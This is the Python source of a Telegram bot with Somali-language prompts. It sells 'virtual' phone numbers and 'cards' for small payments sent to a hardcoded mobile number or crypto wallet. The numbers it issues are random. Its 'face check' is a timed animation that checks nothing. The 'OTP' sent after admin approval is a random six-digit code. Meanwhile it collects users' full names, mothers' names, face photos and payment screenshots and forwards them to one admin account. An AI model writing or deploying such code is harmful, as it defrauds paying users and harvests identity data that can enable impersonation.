import os
import re
import random
import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import *
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 7983838654
LOCAL_NUMBER = "+252907868526"

bot = Bot(BOT_TOKEN, parse_mode="Markdown")
dp = Dispatcher(storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)

users = {}

# ================= STATES =================
class CardState(StatesGroup):
    full_name = State()
    mother = State()
    face_photo = State()
    payment_screenshot = State()

class VirtualState(StatesGroup):
    waiting_payment = State()

class AskState(StatesGroup):
    message = State()

# ================= HELPERS =================
def normal_number():
    return "+25263" + "".join(str(random.randint(0, 9)) for _ in range(7))

def vip_number():
    d = str(random.randint(4, 9))
    return "+25263" + d*3 + str(random.randint(0, 9)) + d*3

def generate_code():
    return "".join(random.choices("0123456789", k=6))

def valid_three_name(text: str):
    parts = text.strip().split()
    if len(parts) != 3:
        return False
    for p in parts:
        if not re.fullmatch(r"[A-Za-z]{3,15}", p):
            return False
    return True

async def live_animation(message, texts, delay=1):
    for t in texts:
        await asyncio.sleep(delay)
        await message.edit_text(t)

# ================= START =================
@dp.message(Command("start"))
async def start(msg: Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="New Order")]],
        resize_keyboard=True
    )
    await msg.answer("Ku soo dhawoow Service Bot 🚀", reply_markup=kb)

@dp.message(F.text == "New Order")
async def new_order(msg: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIRTUAL ($0.8)", callback_data="virtual")],
        [InlineKeyboardButton(text="CARD", callback_data="card")]
    ])
    await msg.answer("Dooro Adeeg:", reply_markup=kb)

# ================= VIRTUAL =================
@dp.callback_query(F.data == "virtual")
async def virtual(call: CallbackQuery):
    number = normal_number()
    users[call.from_user.id] = {
        "type": "virtual",
        "number": number,
        "amount": "$0.8"
    }

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="v_local")],
        [InlineKeyboardButton(text="CRYPTO", callback_data="v_crypto")]
    ])

    await call.message.edit_text(
        f"Number: {number}\nQiimaha: $0.8\n\nDooro Payment Method:",
        reply_markup=kb
    )

# -------- CARD START --------
@dp.callback_query(F.data == "card")
async def card_start(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIP - $15", callback_data="card_vip")],
        [InlineKeyboardButton(text="NORMAL - $1", callback_data="card_normal")]
    ])
    await call.message.edit_text("Dooro Card Nooca:", reply_markup=kb)

@dp.callback_query(F.data.in_(["card_vip", "card_normal"]))
async def card_type(call: CallbackQuery, state: FSMContext):
    level = "VIP" if call.data == "card_vip" else "NORMAL"
    amount = "$15" if level == "VIP" else "$1"
    number = vip_number() if level == "VIP" else normal_number()

    users[call.from_user.id] = {
        "type": "card",
        "level": level,
        "amount": amount,
        "number": number
    }

    await call.message.answer("Geli Magacaaga Saddexan (Ahmed Ali Jama)")
    await state.set_state(CardState.full_name)

# -------- NAME --------
@dp.message(CardState.full_name)
async def get_name(msg: Message, state: FSMContext):
    if not valid_three_name(msg.text):
        await msg.answer("❌ Magac sax ah geli (3 magac dhab ah).")
        return

    users[msg.from_user.id]["name"] = msg.text.title()
    await msg.answer("Geli Magaca Hooyada Saddexan:")
    await state.set_state(CardState.mother)

# -------- MOTHER --------
@dp.message(CardState.mother)
async def get_mother(msg: Message, state: FSMContext):
    if not valid_three_name(msg.text):
        await msg.answer("❌ Magaca Hooyada waa inuu noqdaa 3 magac sax ah.")
        return

    users[msg.from_user.id]["mother"] = msg.text.title()
    await msg.answer("Soo dir Sawirkaaga (Waji cad oo muuqda).")
    await state.set_state(CardState.face_photo)

# -------- FACE CHECK --------
@dp.message(CardState.face_photo, F.photo)
async def get_face(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    check = await msg.answer("Searching.....")
    await live_animation(check, ["Searching.....", "Checking Face....."])

    users[uid]["face"] = msg.photo[-1].file_id

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="card_local")],
        [InlineKeyboardButton(text="CRYPTO", callback_data="card_crypto")]
    ])

    await msg.answer(
        f"Number: {users[uid]['number']}\nQiimaha: {users[uid]['amount']}\n\nDooro Payment Method:",
        reply_markup=kb
    )

# -------- LOCAL --------
@dp.callback_query(F.data == "card_local")
async def card_local(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="card_confirm")]
    ])
    await call.message.edit_text(
        f"Ku dir lacagta number-kan:\n{LOCAL_NUMBER}",
        reply_markup=kb
    )

# -------- CRYPTO --------
@dp.callback_query(F.data == "card_crypto")
async def card_crypto(call: CallbackQuery):
    bnb = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"
    usdt = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="card_confirm")]
    ])

    await call.message.edit_text(
        f"Send Crypto:\n\nBNB:\n`{bnb}`\n\nUSDT:\n`{usdt}`",
        reply_markup=kb
    )

# -------- CONFIRM --------
@dp.callback_query(F.data == "card_confirm")
async def card_confirm(call: CallbackQuery, state: FSMContext):
    await call.message.answer("Soo dir sawirka Lacag bixin taada.")
    await state.set_state(CardState.payment_screenshot)


@dp.message(CardState.payment_screenshot, F.photo)
async def receive_payment(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    users[uid]["payment"] = msg.photo[-1].file_id

    await msg.answer("Waad mahadsantahay, Dalabkaaga sida ugu dhaqsiyaha badan baa loo aqbali doona. 🚀")
    await state.clear()

    kb_admin = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_confirm_{uid}")],
        [InlineKeyboardButton(text="REJECT", callback_data=f"admin_reject_{uid}")],
        [InlineKeyboardButton(text="ASK", callback_data=f"admin_ask_{uid}")]
    ])

    data = users[uid]

    await bot.send_photo(
        ADMIN_ID,
        data["face"],
        caption=(
            f"CODSI CARD\n\n"
            f"User: {uid}\n"
            f"Level: {data['level']}\n"
            f"Number: {data['number']}\n"
            f"Name: {data['name']}\n"
            f"Mother: {data['mother']}\n"
            f"Amount: {data['amount']}"
        ),
        reply_markup=kb_admin
    )

    await bot.send_photo(ADMIN_ID, data["payment"], caption="Payment Screenshot")

# -------- ADMIN CONFIRM --------
@dp.callback_query(F.data.startswith("admin_confirm_"))
async def admin_confirm(call: CallbackQuery):
    uid = int(call.data.split("_")[2])
    code = generate_code()

    otp_msg = await bot.send_message(uid, "OTP.....")
    await live_animation(otp_msg, ["OTP.....", "Generating OTP.....", f"OTP READY ✅\nCode: {code}"])

    await call.message.edit_text("Approved ✅")

# -------- ADMIN REJECT --------
@dp.callback_query(F.data.startswith("admin_reject_"))
async def admin_reject(call: CallbackQuery):
    uid = int(call.data.split("_")[2])
    msg = await bot.send_message(uid, "Checking Payment.....")
    await asyncio.sleep(10)
    await msg.edit_text("Fadlan Lacagta soo dir ❌")

# -------- ADMIN ASK --------
@dp.callback_query(F.data.startswith("admin_ask_"))
async def admin_ask(call: CallbackQuery, state: FSMContext):
    uid = int(call.data.split("_")[2])
    await state.update_data(ask_user=uid)
    await call.message.answer("Qor fariinta aad rabto inaad u dirto user-ka:")
    await state.set_state(AskState.message)

@dp.message(AskState.message)
async def send_ask(msg: Message, state: FSMContext):
    data = await state.get_data()
    uid = data.get("ask_user")
    await bot.send_message(uid, f"Admin:\n{msg.text}")
    await msg.answer("Fariinta waa la diray ✅")
    await state.clear()

# -------- MAIN --------
async def main():
    print("Bot Running 🚀")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
